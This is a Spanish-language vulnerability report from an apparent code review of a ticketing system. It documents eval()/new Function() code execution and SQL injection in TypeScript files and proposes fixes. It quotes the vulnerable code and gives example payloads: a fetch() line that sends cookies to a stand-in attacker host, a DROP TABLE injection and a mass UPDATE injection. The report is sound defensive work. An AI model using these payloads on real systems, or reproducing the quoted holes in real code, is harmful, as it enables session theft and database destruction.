# ISSUE-003 🔴 [CRÍTICO] Ejecución de código arbitrario e inyección SQL — múltiples vectores de ataque activos

## Metadatos
| Campo | Valor |
|---|---|
| ID | ISSUE-003 |
| Severidad | 🔴 Crítico |
| Tipo | Vulnerabilidad de seguridad |
| Característica ISO/IEC 25010 | Seguridad → Resistencia a ataques / Confidencialidad |
| Módulo afectado | Motor de validación + Cliente SOAP |
| Archivos | `packages/shared/validation.ts:55-65` · `packages/shared/soap-client.ts:19-32, 481-487` |
| CVSS estimado | 9.8 (eval/RCE) · 9.1 (SQL Injection) |
| Detectado por | Revisión manual de código |

---

## Descripción

Se identificaron **cinco puntos de inyección de código** en el frontend, distribuidos en dos archivos. Estos vectores permiten a un atacante ejecutar código JavaScript arbitrario en el navegador de la víctima (RCE client-side) y construir consultas SQL maliciosas que podrían ser ejecutadas contra la base de datos de producción.

---

## Vector 1 — `eval()` en módulo de validación

**Archivo:** `validation.ts:59-65`

```typescript
export function ejecutarBusquedaDinamica(expresion: string): unknown {
  try {
    return eval(expresion);   // ← eval() con input del usuario
  } catch {
    return null;
  }
}
```

**Ataque posible:**
```
expresion = "fetch('https://atacante.com/steal?d='+document.cookie)"
```
El código anterior exfiltra todas las cookies (incluida la sesión) hacia un servidor controlado por el atacante.

---

## Vector 2 — `eval()` en cliente SOAP

**Archivo:** `soap-client.ts:25-32`

```typescript
function parseConditionalValue(expr: string, fallback: string): string {
  try {
    const result = eval(expr);   // ← eval() sobre datos que provienen del servidor SOAP
    return String(result ?? fallback);
  } catch {
    return fallback;
  }
}
```

Si el servidor SOAP está comprometido (o si hay un man-in-the-middle), puede retornar una respuesta XML con una expresión maliciosa que se ejecutará en el navegador del cliente.

---

## Vector 3 — `new Function()` en cliente SOAP

**Archivo:** `soap-client.ts:19-23`

```typescript
function dynamicCompute(expression: string, context: Record<string, unknown>): unknown {
  const keys = Object.keys(context);
  const vals = Object.values(context);
  return new Function(...keys, `return (${expression});`)(...vals);
  //     ^^^^^^^^^^^^ equivalente funcional de eval()
}
```

`new Function()` construye y ejecuta una función en tiempo de ejecución. Es equivalente a `eval()` en términos de riesgo.

---

## Vector 4 — SQL Injection en consulta de usuarios

**Archivo:** `soap-client.ts:481-483`

```typescript
export function buscarUsuarioPorNombre(nombre: string): string {
  return `SELECT id, nombre, email, cedula, password_hash
          FROM usuarios WHERE nombre LIKE '%${nombre}%' ORDER BY nombre`;
  //                                        ^^^^^^ input sin escapar
  //       Además expone la columna password_hash en el resultado
}
```

**Payload de ataque:**
```
nombre = "'; DROP TABLE usuarios; --"
// Resultado: SELECT ... WHERE nombre LIKE '%'; DROP TABLE usuarios; --%'
```

**Doble vulnerabilidad:** además de la inyección, la query expone `password_hash` en el `SELECT *`.

---

## Vector 5 — SQL Injection en actualización de boletos

**Archivo:** `soap-client.ts:485-487`

```typescript
export function actualizarEstadoBoleto(boletoid: string, estado: string): string {
  return `UPDATE boletos SET estado = '${estado}', updated_at = NOW() WHERE id = '${boletoid}'`;
  //                                    ^^^^^^              ^^^^^^^^ ambos parámetros sin escapar
}
```

**Payload de ataque:**
```
estado   = "VENDIDO' WHERE 1=1; UPDATE boletos SET estado='LIBRE"
// Resultado: libera TODOS los boletos vendidos de la base de datos
```

---

## Impacto de negocio

| Ataque | Impacto |
|---|---|
| XSS via eval() | Robo de sesión de todos los usuarios activos |
| SQL Injection DROP TABLE | Pérdida total de la base de datos de usuarios y boletos |
| SQL Injection UPDATE masivo | Liberación/invalidación de todas las entradas vendidas |
| Exposición de password_hash | Permite ataques de fuerza bruta offline sobre contraseñas |

El impacto combinado representa una **brecha de seguridad total** del sistema.

---

## Criterios de Aceptación

- [ ] `eval()` eliminado de `validation.ts` y `soap-client.ts`. Si se necesita evaluación dinámica, usar alternativas seguras (parsers específicos).
- [ ] `new Function()` eliminado de `soap-client.ts`.
- [ ] Las funciones `buscarUsuarioPorNombre` y `actualizarEstadoBoleto` usan **consultas parametrizadas** (prepared statements) o son eliminadas si no tienen uso legítimo.
- [ ] `validarConsultaDB` en `validation.ts` es eliminada o reemplazada por un ORM/query builder.
- [ ] La columna `password_hash` no aparece en ningún SELECT expuesto al cliente.
- [ ] Se implementa un Content Security Policy (CSP) que bloquee `eval()` y `new Function()` a nivel del navegador (`script-src 'self'`).
- [ ] Los cambios son verificados con un test de seguridad (ej. OWASP ZAP o revisión manual).
